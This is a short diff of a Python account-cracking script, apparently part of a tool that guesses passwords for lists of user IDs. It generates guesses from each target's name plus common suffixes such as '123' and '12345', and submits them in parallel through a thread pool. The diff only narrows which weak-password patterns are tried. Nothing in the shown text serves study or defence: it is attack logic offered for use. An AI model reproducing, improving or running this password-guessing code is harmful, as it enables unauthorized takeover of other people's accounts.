@@ -184,13 +184,13 @@ class crack:
 				for email in id:
 					uid,name=email.split("|")
 					if(len(str(name.lower()))>=6):
-						pw=[name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','bismillah']
+						pw=[name.lower()+'123',name.lower()+'12345']
 					elif(len(str(name.lower()))<=2):
-						pw=[name.lower()+'1234',name.lower()+'12345','bismillah']
+						pw=[name.lower()+'123',name.lower()+'12345']
 					elif(len(str(name.lower()))<=3):
-						pw=[name.lower()+'123',name.lower()+'1234',name.lower()+'12345','bismillah']
+						pw=[name.lower()+'123',name.lower()+'12345']
 					else:
-						pw=[name.lower()+'12345','bismillah']
+						pw=[name.lower()+'123',name.lower()+'12345']
 					if(tip in ("02","2")):
 						kirim.submit(self.crack,uid,pw,name.lower())
 					elif(tip in ("01","1")):
